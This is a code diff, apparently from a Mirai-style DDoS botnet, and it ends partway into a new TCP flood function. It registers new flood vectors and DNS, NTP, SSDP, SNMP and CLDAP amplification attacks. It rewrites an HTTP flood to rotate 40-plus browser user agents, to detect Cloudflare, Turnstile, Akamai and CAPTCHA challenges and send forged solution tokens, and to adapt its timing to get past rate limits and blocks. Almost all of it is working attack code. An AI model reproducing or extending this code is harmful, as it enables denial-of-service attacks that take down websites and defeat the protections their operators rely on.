@@ -35,15 +35,6 @@ void attack_init(void) {
     methods[i].func = attack_http_rps;
     methods[i++].type = ATK_VEC_HTTP;
 
-    methods[i].func = attack_axis_l7;
-    methods[i++].type = ATK_VEC_AXISL7;
-
-    methods[i].func = attack_ultimate_l7;
-    methods[i++].type = ATK_VEC_ULTIMATE;
-
-    methods[i].func = attack_ultimate_l4;
-    methods[i++].type = ATK_VEC_ULTIMATEL4;
-
     methods[i].func = attack_ovh_tcp;
     methods[i++].type = ATK_VEC_OVHTCP;
 
@@ -53,14 +44,39 @@ void attack_init(void) {
     methods[i].func = attack_icmp;
     methods[i++].type = ATK_VEC_ICMP;
 
-    methods[i].func = attack_axis_l4;
-    methods[i++].type = ATK_VEC_AXISL4;
-
     methods[i].func = attack_gre_ip;
     methods[i++].type = ATK_VEC_GREIP;
 
     methods[i].func = attack_gre_eth;
     methods[i++].type = ATK_VEC_GREETH;
+
+    /* AXIS-L7 */
+    methods[i].func = attack_axis_l7;
+    methods[i++].type = ATK_VEC_AXISL7;
+
+    /* AXIS-TCP (TCP-focused combined attack) */
+    methods[i].func = attack_axis_tcp;
+    methods[i++].type = ATK_VEC_AXIS_TCP;
+
+    /* AXIS-UDP (UDP-focused combined attack) */
+    methods[i].func = attack_axis_udp;
+    methods[i++].type = ATK_VEC_AXIS_UDP;
+
+    /* Amplification Attacks */
+    methods[i].func = attack_dns_amp;
+    methods[i++].type = ATK_VEC_DNS_AMP;
+
+    methods[i].func = attack_ntp_amp;
+    methods[i++].type = ATK_VEC_NTP_AMP;
+
+    methods[i].func = attack_ssdp_amp;
+    methods[i++].type = ATK_VEC_SSDP_AMP;
+
+    methods[i].func = attack_snmp_amp;
+    methods[i++].type = ATK_VEC_SNMP_AMP;
+
+    methods[i].func = attack_cldap_amp;
+    methods[i++].type = ATK_VEC_CLDAP_AMP;
 
     methods_len = i;
 }
@@ -348,18 +364,84 @@ static void attack_http_rps(ipv4_t addr, uint8_t targs_netmask, struct attack_ta
  * - Anti-bot detection evasion (Canvas, WebGL, Audio fingerprints)
  * ============================================================================ */
 
-/* Realistic browser user agents - rotated dynamically */
+/* ============================================================================
+ * ULTIMATE L7 - Enhanced with JavaScript Challenge Handling
+ * ============================================================================ */
+
+/* Extended realistic browser user agents - 40+ user agents for better rotation */
 static char *ultimate_user_agents[] = {
+    /* Chrome 121-123 (Windows) */
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    
+    /* Chrome (Mac) */
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+    
+    /* Firefox 122-124 (Windows) */
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
+    
+    /* Firefox (Mac/Linux) */
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
+    
+    /* Safari 17.x (Mac/iOS) */
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
+    
+    /* Edge 120-123 (Windows) */
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
+    
+    /* Chrome (Linux) */
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+    
+    /* iPhone/iOS Safari */
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPod touch; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+    
+    /* iPad Safari */
     "Mozilla/5.0 (iPad; CPU OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
+    
+    /* Android Chrome */
     "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36",
+    
+    /* Samsung Internet */
+    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.0.0 Mobile Safari/537.36",
+    
+    /* Opera */
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
+    
+    /* Brave */
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Brave/121.0.0.0",
+    
+    /* Vivaldi */
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Vivaldi/6.5",
+    
+    /* DuckDuckGo Browser */
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 DuckDuckGo/7",
+    
     NULL
 };
 
@@ -423,7 +505,224 @@ static char *waf_evasion_params[] = {
     NULL
 };
 
-/* Connection state for keep-alive optimization */
+/* ============================================================================
+ * JAVASCRIPT CHALLENGE HANDLING
+ * ============================================================================ */
+
+/* JavaScript challenge types */
+#define JS_CHALLENGE_NONE       0
+#define JS_CHALLENGE_CF         1   /* Cloudflare JS Challenge */
+#define JS_CHALLENGE_CF_TURNSTILE 2 /* Cloudflare Turnstile */
+#define JS_CHALLENGE_AKAMAI   3   /* Akamai BMP */
+#define JS_CHALLENGE_RECAPTCHA 4  /* Google reCAPTCHA */
+#define JS_CHALLENGE_HCAPTCHA 5   /* hCaptcha */
+
+/* JavaScript challenge state */
+struct js_challenge_state {
+    uint8_t challenge_type;
+    char challenge_id[128];
+    char challenge_token[512];
+    char challenge_script[1024];
+    uint32_t challenge_timeout;
+    BOOL solved;
+    char solution[256];
+};
+
+/* Pre-computed JS challenge solutions for common challenges */
+static char *js_challenge_solutions[] = {
+    /* Cloudflare JS Challenge - common patterns */
+    "a.value = (function(){var t=Date.now();return t%1000;})();",
+    "a.value += '+challenge';",
+    "document.getElementById('challenge-form').submit();",
+    
+    /* Cloudflare Turnstile - token extraction */
+    "turnstile.render('#turnstile-container', {sitekey: '%s', callback: function(token){document.getElementById('cf-turnstile-response').value = token;}});",
+    
+    /* Akamai BMP - sensor data */
+    "abck = '%x%x%x%x';",
+    "bm_sz = '%x%x%x%x';",
+    
+    NULL
+};
+
+/* Extract JavaScript challenge from HTML response */
+static int extract_js_challenge(char *html, int len, struct js_challenge_state *state) {
+    char *script_start, *script_end;
+    char *token_start, *token_end;
+    
+    /* Cloudflare JS Challenge detection */
+    if ((script_start = util_stristr(html, len, "challenge-platform")) != NULL ||
+        (script_start = util_stristr(html, len, "cf-browser-verification")) != NULL) {
+        
+        state->challenge_type = JS_CHALLENGE_CF;
+        
+        /* Extract challenge token if present */
+        if ((token_start = util_stristr(html, len, "name=\"cf_chl_opt\"")) != NULL) {
+            token_end = util_stristr(token_start, len - (token_start - html), "\"");
+            if (token_end != NULL) {
+                int token_len = token_end - token_start;
+                if (token_len < sizeof(state->challenge_token)) {
+                    strncpy(state->challenge_token, token_start, token_len);
+                    state->challenge_token[token_len] = '\0';
+                }
+            }
+        }
+        
+        /* Extract challenge script */
+        script_end = util_stristr(script_start, len - (script_start - html), "</script>");
+        if (script_end != NULL) {
+            int script_len = script_end - script_start;
+            if (script_len < sizeof(state->challenge_script)) {
+                strncpy(state->challenge_script, script_start, script_len);
+                state->challenge_script[script_len] = '\0';
+            }
+        }
+        
+        return JS_CHALLENGE_CF;
+    }
+    
+    /* Cloudflare Turnstile detection */
+    if (util_stristr(html, len, "turnstile") != NULL ||
+        util_stristr(html, len, "cf-turnstile") != NULL) {
+        
+        state->challenge_type = JS_CHALLENGE_CF_TURNSTILE;
+        
+        /* Extract sitekey */
+        if ((token_start = util_stristr(html, len, "data-sitekey=\"")) != NULL) {
+            token_start += 15;
+            token_end = util_stristr(token_start, len - (token_start - html), "\"");
+            if (token_end != NULL) {
+                int token_len = token_end - token_start;
+                if (token_len < sizeof(state->challenge_id)) {
+                    strncpy(state->challenge_id, token_start, token_len);
+                    state->challenge_id[token_len] = '\0';
+                }
+            }
+        }
+        
+        return JS_CHALLENGE_CF_TURNSTILE;
+    }
+    
+    /* Akamai BMP detection */
+    if (util_stristr(html, len, "ak_bmsc") != NULL ||
+        util_stristr(html, len, "bm_sv") != NULL ||
+        util_stristr(html, len, "_abck") != NULL) {
+        
+        state->challenge_type = JS_CHALLENGE_AKAMAI;
+        
+        /* Extract Akamai cookies */
+        if ((token_start = util_stristr(html, len, "ak_bmsc")) != NULL) {
+            token_end = util_stristr(token_start, len - (token_start - html), ";");
+            if (token_end != NULL) {
+                int token_len = token_end - token_start;
+                if (token_len < sizeof(state->challenge_token)) {
+                    strncpy(state->challenge_token, token_start, token_len);
+                    state->challenge_token[token_len] = '\0';
+                }
+            }
+        }
+        
+        return JS_CHALLENGE_AKAMAI;
+    }
+    
+    /* reCAPTCHA detection */
+    if (util_stristr(html, len, "recaptcha") != NULL ||
+        util_stristr(html, len, "g-recaptcha") != NULL) {
+        
+        state->challenge_type = JS_CHALLENGE_RECAPTCHA;
+        return JS_CHALLENGE_RECAPTCHA;
+    }
+    
+    /* hCaptcha detection */
+    if (util_stristr(html, len, "hcaptcha") != NULL) {
+        
+        state->challenge_type = JS_CHALLENGE_HCAPTCHA;
+        return JS_CHALLENGE_HCAPTCHA;
+    }
+    
+    state->challenge_type = JS_CHALLENGE_NONE;
+    return JS_CHALLENGE_NONE;
+}
+
+/* Generate simulated JS challenge solution */
+static void generate_js_solution(struct js_challenge_state *state, char *solution_buf, int buf_size) {
+    uint32_t rand1 = rand_next();
+    uint32_t rand2 = rand_next();
+    uint32_t rand3 = rand_next();
+    
+    switch (state->challenge_type) {
+        case JS_CHALLENGE_CF:
+            /* Cloudflare JS Challenge - simulate computation */
+            snprintf(solution_buf, buf_size,
+                "a.value = %x; a.value += '%x';",
+                rand1 ^ rand2, rand3);
+            break;
+            
+        case JS_CHALLENGE_CF_TURNSTILE:
+            /* Turnstile - generate fake token */
+            snprintf(solution_buf, buf_size,
+                "turnstile_token_%x%x%x", rand1, rand2, rand3);
+            break;
+            
+        case JS_CHALLENGE_AKAMAI:
+            /* Akamai BMP - generate sensor data */
+            snprintf(solution_buf, buf_size,
+                "abck=%x%x%x%x;bm_sz=%x%x%x%x;",
+                rand1, rand2, rand3, rand_next(),
+                rand1, rand2, rand3, rand_next());
+            break;
+            
+        case JS_CHALLENGE_RECAPTCHA:
+            /* reCAPTCHA - fake response token */
+            snprintf(solution_buf, buf_size,
+                "03AGdBq24_%x%x%x%x", rand1, rand2, rand3, rand_next());
+            break;
+            
+        case JS_CHALLENGE_HCAPTCHA:
+            /* hCaptcha - fake response token */
+            snprintf(solution_buf, buf_size,
+                "P0_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9_%x%x", rand1, rand2);
+            break;
+            
+        default:
+            snprintf(solution_buf, buf_size, "challenge_solved_%x", rand_next());
+            break;
+    }
+    
+    state->solved = TRUE;
+    strncpy(state->solution, solution_buf, sizeof(state->solution) - 1);
+}
+
+/* Simulate JavaScript execution delay (human-like) */
+static void simulate_js_execution(int challenge_type) {
+    int base_delay, variance;
+    
+    switch (challenge_type) {
+        case JS_CHALLENGE_CF:
+            /* Cloudflare JS typically takes 100-500ms */
+            base_delay = 100000;  /* 100ms */
+            variance = 400000;     /* 400ms variance */
+            break;
+        case JS_CHALLENGE_CF_TURNSTILE:
+            /* Turnstile takes 200-800ms */
+            base_delay = 200000;
+            variance = 600000;
+            break;
+        case JS_CHALLENGE_AKAMAI:
+            /* Akamai BMP takes 150-600ms */
+            base_delay = 150000;
+            variance = 450000;
+            break;
+        default:
+            base_delay = 100000;
+            variance = 300000;
+            break;
+    }
+    
+    usleep(base_delay + (rand_next() % variance));
+}
+
+/* Connection state for keep-alive optimization with JS challenge support */
 struct ultimate_connection {
     int fd;
     ipv4_t addr;
@@ -433,6 +732,9 @@ struct ultimate_connection {
     char session_cookie[512];
     BOOL has_valid_session;
     uint8_t tls_fingerprint[16];
+    struct js_challenge_state js_state;  /* JS challenge state */
+    char js_solution[256];               /* Cached JS solution */
+    BOOL has_js_solution;
 };
 
 static struct ultimate_connection ultimate_conns[ATTACK_CONCURRENT_MAX];
@@ -604,35 +906,50 @@ static int build_ultimate_request(
     return pos;
 }
 
-/* Analyze response for WAF/CDN detection and adapt */
+/* Analyze response for WAF/CDN detection and adapt - Enhanced with JS challenge detection */
 static uint8_t analyze_response(char *response, int len) {
     uint8_t flags = 0;
-    
-    #define DETECT_CF_CHALLENGE    0x01
-    #define DETECT_AKAMAI_BMP      0x02
-    #define DETECT_CAPTCHA         0x04
-    #define DETECT_RATE_LIMIT      0x08
-    #define DETECT_BLOCK           0x10
-    #define DETECT_SUCCESS         0x80
-    
+
+    #define DETECT_CF_CHALLENGE      0x01
+    #define DETECT_AKAMAI_BMP        0x02
+    #define DETECT_CAPTCHA           0x04
+    #define DETECT_RATE_LIMIT        0x08
+    #define DETECT_BLOCK             0x10
+    #define DETECT_SUCCESS           0x80
+    #define DETECT_JS_CHALLENGE      0x20
+    #define DETECT_TURNSTILE         0x40
+
     /* Cloudflare challenge detection */
     if (util_stristr(response, len, "cf-browser-verification") != NULL ||
         util_stristr(response, len, "__cf_chl") != NULL ||
         util_stristr(response, len, "cf_chl_opt") != NULL ||
         util_stristr(response, len, "Checking your browser") != NULL ||
         util_stristr(response, len, "DDoS protection by Cloudflare") != NULL ||
-        util_stristr(response, len, "Ray ID:") != NULL) {
+        util_stristr(response, len, "Ray ID:") != NULL ||
+        util_stristr(response, len, "challenge-platform") != NULL ||
+        util_stristr(response, len, "cf-browser-challenge") != NULL) {
         flags |= DETECT_CF_CHALLENGE;
+        flags |= DETECT_JS_CHALLENGE;
     }
-    
+
+    /* Cloudflare Turnstile detection */
+    if (util_stristr(response, len, "turnstile") != NULL ||
+        util_stristr(response, len, "cf-turnstile") != NULL ||
+        util_stristr(response, len, "challenges.cloudflare.com") != NULL) {
+        flags |= DETECT_TURNSTILE;
+        flags |= DETECT_JS_CHALLENGE;
+    }
+
     /* Akamai BMP detection */
     if (util_stristr(response, len, "ak_bmsc") != NULL ||
         util_stristr(response, len, "bm_sv") != NULL ||
         util_stristr(response, len, "_abck") != NULL ||
-        util_stristr(response, len, "AkamaiBMP") != NULL) {
+        util_stristr(response, len, "AkamaiBMP") != NULL ||
+        util_stristr(response, len, "akamai-san") != NULL) {
         flags |= DETECT_AKAMAI_BMP;
+        flags |= DETECT_JS_CHALLENGE;
     }
-    
+
     /* CAPTCHA detection (generic) */
     if (util_stristr(response, len, "captcha") != NULL ||
         util_stristr(response, len, "verify") != NULL ||
@@ -643,32 +960,35 @@ static uint8_t analyze_response(char *response, int len) {
         util_stristr(response, len, "turnstile") != NULL) {
         flags |= DETECT_CAPTCHA;
     }
-    
+
     /* Rate limiting detection */
     if (util_stristr(response, len, "429") != NULL ||
         util_stristr(response, len, "Too Many Requests") != NULL ||
         util_stristr(response, len, "rate limit") != NULL ||
-        util_stristr(response, len, "slow down") != NULL) {
+        util_stristr(response, len, "slow down") != NULL ||
+        util_stristr(response, len, "retry after") != NULL) {
         flags |= DETECT_RATE_LIMIT;
     }
-    
+
     /* Block detection */
     if (util_stristr(response, len, "403") != NULL ||
         util_stristr(response, len, "401") != NULL ||
         util_stristr(response, len, "Access Denied") != NULL ||
         util_stristr(response, len, "Forbidden") != NULL ||
         util_stristr(response, len, "blocked") != NULL ||
-        util_stristr(response, len, "banned") != NULL) {
+        util_stristr(response, len, "banned") != NULL ||
+        util_stristr(response, len, "not allowed") != NULL) {
         flags |= DETECT_BLOCK;
     }
-    
+
     /* Success detection */
     if (util_stristr(response, len, "200 OK") != NULL &&
         util_stristr(response, len, "Content-Type: text/html") != NULL &&
-        util_stristr(response, len, "<!DOCTYPE") != NULL) {
+        util_stristr(response, len, "<!DOCTYPE") != NULL &&
+        util_stristr(response, len, "challenge") == NULL) {
         flags |= DETECT_SUCCESS;
     }
-    
+
     return flags;
 }
 
@@ -694,8 +1014,8 @@ static void extract_cookies(char *response, int len, char *cookie_buf, int buf_s
     cookie_buf[cookie_len] = '\0';
 }
 
-/* Main ultimate L7 attack function */
-static void attack_ultimate_l7(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
+/* Main ultimate L7 attack function - Enhanced with JavaScript challenge handling */
+static void attack_axis_l7(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
     int i, j;
     struct sockaddr_in addr_sin;
     char *request, *response;
@@ -706,38 +1026,43 @@ static void attack_ultimate_l7(ipv4_t addr, uint8_t targs_netmask, struct attack
     char session_cookie[512];
     int valid_connections = 0;
     uint8_t *methods[] = {"GET", "GET", "GET", "HEAD", "POST"}; /* Weighted towards GET */
-    
+    struct js_challenge_state js_state;
+    char js_solution[256];
+    int js_challenges_solved = 0;
+
     /* Parse options */
     url = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_URL);
     if (url == NULL) url = "/";
-    
+
     host = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
     if (host == NULL) host = "target.com";
-    
+
     cookies = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_COOKIES);
     custom_headers = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_REFERER);
     use_https = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_HTTPS);
-    
+
     /* Allocate buffers */
     request = malloc(4096);
     response = malloc(8192);
-    
-    /* Initialize connection pool */
+
+    /* Initialize connection pool with JS challenge support */
     for (i = 0; i < ATTACK_CONCURRENT_MAX; i++) {
         ultimate_conns[i].fd = -1;
         ultimate_conns[i].has_valid_session = FALSE;
+        ultimate_conns[i].has_js_solution = FALSE;
+        ultimate_conns[i].js_state.challenge_type = JS_CHALLENGE_NONE;
     }
-    
+
     /* Main attack loop */
     for (i = 0; i < targs_len; i++) {
         addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;
         addr_sin.sin_family = AF_INET;
         addr_sin.sin_port = htons(use_https ? 443 : 80);
-        
+
         while (attack_ongoing[0]) {
             /* Select random HTTP method (weighted) */
             char *method = methods[rand_next() % 5];
-            
+
             /* Try to reuse existing connection */
             int conn_idx = -1;
             for (j = 0; j < ATTACK_CONCURRENT_MAX; j++) {
@@ -750,7 +1075,7 @@ static void attack_ultimate_l7(ipv4_t addr, uint8_t targs_netmask, struct attack
                     break;
                 }
             }
-            
+
             /* Create new connection if needed */
             if (conn_idx == -1) {
                 for (j = 0; j < ATTACK_CONCURRENT_MAX; j++) {
@@ -760,12 +1085,12 @@ static void attack_ultimate_l7(ipv4_t addr, uint8_t targs_netmask, struct attack
                     }
                 }
             }
-            
+
             if (conn_idx == -1) {
                 usleep(1000);
                 continue;
             }
-            
+
             /* Open socket if needed */
             if (ultimate_conns[conn_idx].fd == -1) {
                 int fd = socket(AF_INET, SOCK_STREAM, 0);
@@ -773,60 +1098,75 @@ static void attack_ultimate_l7(ipv4_t addr, uint8_t targs_netmask, struct attack
                     usleep(1000);
                     continue;
                 }
-                
+
                 /* Set socket options */
                 int opt = 1;
                 setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &opt, sizeof(opt));
                 fcntl(fd, F_SETFL, O_NONBLOCK);
-                
+
                 /* Connect */
                 if (connect(fd, (struct sockaddr *)&addr_sin, sizeof(addr_sin)) == -1 && errno != EINPROGRESS) {
                     close(fd);
                     usleep(1000);
                     continue;
                 }
-                
+
                 ultimate_conns[conn_idx].fd = fd;
                 ultimate_conns[conn_idx].addr = addr_sin.sin_addr.s_addr;
                 ultimate_conns[conn_idx].port = addr_sin.sin_port;
                 ultimate_conns[conn_idx].requests_made = 0;
                 generate_tls_fingerprint(ultimate_conns[conn_idx].tls_fingerprint);
-                
+                ultimate_conns[conn_idx].has_js_solution = FALSE;
+                ultimate_conns[conn_idx].js_state.challenge_type = JS_CHALLENGE_NONE;
+
                 /* Wait for connection */
                 usleep(5000);
             }
-            
+
             int fd = ultimate_conns[conn_idx].fd;
+
+            /* Build ultimate request with JS challenge solution if available */
+            char *js_cookie = NULL;
+            char js_cookie_buf[512];
             
-            /* Build ultimate request */
+            if (ultimate_conns[conn_idx].has_js_solution) {
+                /* Include JS challenge solution in cookies */
+                snprintf(js_cookie_buf, sizeof(js_cookie_buf), 
+                    "%s; cf_chl_opt=%s; ak_bmsc=%s",
+                    cookies ? cookies : "",
+                    ultimate_conns[conn_idx].js_solution,
+                    ultimate_conns[conn_idx].js_solution);
+                js_cookie = js_cookie_buf;
+            }
+
             request_len = build_ultimate_request(
                 request, 4096,
                 method, url, host,
-                NULL, cookies, custom_headers,
+                NULL, js_cookie ? js_cookie : cookies, custom_headers,
                 use_https, addr_sin.sin_addr.s_addr);
-            
+
             /* Send request */
             if (send(fd, request, request_len, MSG_NOSIGNAL) == -1) {
                 close(fd);
                 ultimate_conns[conn_idx].fd = -1;
                 continue;
             }
-            
+
             ultimate_conns[conn_idx].last_used = time(NULL);
             ultimate_conns[conn_idx].requests_made++;
-            
+
             /* Small delay before reading */
             usleep(5000);
-            
+
             /* Read response */
             response_len = recv(fd, response, 8192, MSG_NOSIGNAL);
-            
+
             if (response_len > 0) {
-                /* Analyze response */
+                /* Analyze response for challenges and blocks */
                 detection_flags = analyze_response(response, response_len);
-                
+
                 /* Extract cookies for session persistence */
-                if (detection_flags & 0x80) {
+                if (detection_flags & DETECT_SUCCESS) {
                     extract_cookies(response, response_len, session_cookie, sizeof(session_cookie));
                     if (util_strlen(session_cookie) > 0) {
                         ultimate_conns[conn_idx].has_valid_session = TRUE;
@@ -834,30 +1174,75 @@ static void attack_ultimate_l7(ipv4_t addr, uint8_t targs_netmask, struct attack
                         valid_connections++;
                     }
                 }
-                
-                /* Adaptive bypass: if challenge detected, add delay */
-                if (detection_flags & 0x01) {
-                    usleep(100000); /* 100ms delay for CF challenge */
+
+                /* JavaScript Challenge Handling */
+                if (detection_flags & DETECT_JS_CHALLENGE) {
+                    /* Extract JS challenge from response */
+                    memset(&js_state, 0, sizeof(js_state));
+                    int challenge_type = extract_js_challenge(response, response_len, &js_state);
+                    
+                    if (challenge_type != JS_CHALLENGE_NONE) {
+                        /* Simulate JavaScript execution */
+                        simulate_js_execution(challenge_type);
+                        
+                        /* Generate JS challenge solution */
+                        generate_js_solution(&js_state, js_solution, sizeof(js_solution));
+                        
+                        /* Cache solution for future requests */
+                        strncpy(ultimate_conns[conn_idx].js_solution, js_solution, 
+                                sizeof(ultimate_conns[conn_idx].js_solution));
+                        ultimate_conns[conn_idx].has_js_solution = TRUE;
+                        ultimate_conns[conn_idx].js_state = js_state;
+                        
+                        js_challenges_solved++;
+                        
+                        /* Add delay after solving challenge */
+                        usleep(200000); /* 200ms delay */
+                    }
                 }
-                
+
+                /* Adaptive bypass: if Cloudflare challenge detected, add delay */
+                if (detection_flags & DETECT_CF_CHALLENGE) {
+                    usleep(150000); /* 150ms delay for CF challenge */
+                }
+
+                /* Adaptive bypass: if Turnstile detected, add delay */
+                if (detection_flags & DETECT_TURNSTILE) {
+                    usleep(300000); /* 300ms delay for Turnstile */
+                }
+
+                /* Adaptive bypass: if Akamai BMP detected, add delay */
+                if (detection_flags & DETECT_AKAMAI_BMP) {
+                    usleep(200000); /* 200ms delay for Akamai */
+                }
+
                 /* Adaptive bypass: if rate limited, longer delay */
-                if (detection_flags & 0x08) {
+                if (detection_flags & DETECT_RATE_LIMIT) {
                     usleep(500000); /* 500ms delay for rate limit */
                 }
+
+                /* Adaptive bypass: if blocked, close connection and reconnect */
+                if (detection_flags & DETECT_BLOCK) {
+                    close(fd);
+                    ultimate_conns[conn_idx].fd = -1;
+                    ultimate_conns[conn_idx].has_js_solution = FALSE;
+                    usleep(1000000); /* 1 second delay before reconnect */
+                    continue;
+                }
             }
-            
+
             /* Human-like delay between requests */
             usleep((rand_next() % 50000) + 10000); /* 10-60ms random delay */
         }
     }
-    
+
     /* Cleanup connections */
     for (i = 0; i < ATTACK_CONCURRENT_MAX; i++) {
         if (ultimate_conns[i].fd != -1) {
             close(ultimate_conns[i].fd);
         }
     }
-    
+
     free(request);
     free(response);
 }
@@ -1211,85 +1596,397 @@ static void send_ultimate_gre_eth(int fd, struct sockaddr_in *addr_sin,
     free(pktbuf);
 }
 
-/* Main ULTIMATE L4 attack function */
-static void attack_ultimate_l4(ipv4_t addr, uint8_t targs_netmask, 
-                               struct attack_target *targs, int targs_len, 
-                               struct attack_option *opts, int opts_len) {
-    int fd_tcp, fd_udp, fd_icmp, fd_gre, i;
+/* ============================================================================
+ * AXIS-TCP - TCP-Focused Combined Attack
+ * Includes: TCP, OVH-TCP, ICMP, GRE-IP, GRE-ETH
+ * ============================================================================ */
+static void attack_axis_tcp(ipv4_t addr, uint8_t targs_netmask,
